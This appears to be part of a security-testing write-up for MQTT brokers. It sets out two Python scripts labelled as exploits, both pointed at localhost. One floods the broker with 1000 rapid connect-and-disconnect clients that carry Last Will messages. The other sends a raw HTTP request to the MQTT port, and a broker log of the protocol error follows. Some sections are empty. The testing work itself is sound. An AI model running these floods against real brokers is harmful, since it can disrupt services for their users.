## Last Will Payload

The attack mechanism simulates a test condition for the broker to handle connections and Last Will messages from a large number of clients rapidly connecting and disconnecting. 

### Requirements
+ This attack is simulated using `Python 3.11.8`.
+ In the attack, three libraries are imported
    * `paho.mqtt.client`: This library is essential for MQTT communication, enabling the creation and management of MQTT client connections, publishing messages, and subscribing to topics. To install this module click [hier](https://eclipse.dev/paho/index.php?page=clients/python/index.php).
    * `time`: This standard Python library is used for its sleep function, which introduces delays in this case, 0.1 seconds between client connections and disconnections, effectively simulating rapid client turnover and testing the broker's handling of last will messages.
    * `random`: The library is also imported but not used in the given code snippet
### Exploit    
```python
import random
import paho.mqtt.client as mqtt
import time

def connect_client(client_id, will_topic, broker_address="127.0.0.1"):
    client = mqtt.Client(client_id)
    client.will_set(will_topic, payload="Last Will Message", qos=1, retain=False)
    client.connect(broker_address, 1883, 60)
    return client

def main():
    broker_address = "127.0.0.1"
    will_topic = "test/lastwill"

    clients = []
    try:
        for i in range(1000):  # range for the flooding effect
            client_id = f"Client_{i}"
            client = connect_client(client_id, will_topic, broker_address)
            clients.append(client)
            time.sleep(0.1)
            client.disconnect() # disconnect after 0.1 connecting to trigger the Last Will message
    finally:
        for client in clients:
            client.loop_stop()

if __name__ == '__main__':
    main()
```
### Functionality
The function `connect_client()` takes the parameters `client_id`, `will_topic`, and `broker_address`. It creates an MQTT client with a unique ID and sets up a last will message on `will_topic`, In the `will_set` method, the `qos` parameter is set to `1`. This ensures that messages are delivered at least once and the `retain` flag is set to `False`,means the broker does not retain the message. Finally, it connects to the broker at the loopback address using the default MQTT port. Iterates to create 1000 clients. Each client is connected and then quickly disconnected after a 0.1-second pause, triggering the broker to send the last will message.

## Non-MQTT Protocol Based Requests

## HTTP Requests Misinterpreted

### Requirements

### Exploit
```python
import socket

broker_address = "127.0.0.1"
broker_port = 1883

def send_http_request_as_mqtt(broker_address, broker_port):
    # socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((broker_address, broker_port))

    # HTTP request
    http_request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(broker_address)
    
    try:
        # sending HTTP request to MQTT port
        sock.sendall(http_request.encode())
        response = sock.recv(1024)  # Receiving the response from the server
        print("Received:", response.decode())
    finally:
        sock.close()

send_http_request_as_mqtt(broker_address, broker_port)
```
### Functionality
### Output
```bash
1713516729: New connection from 127.0.0.1:50058 on port 1883.
1713516729: Client <unknown> disconnected due to protocol error.
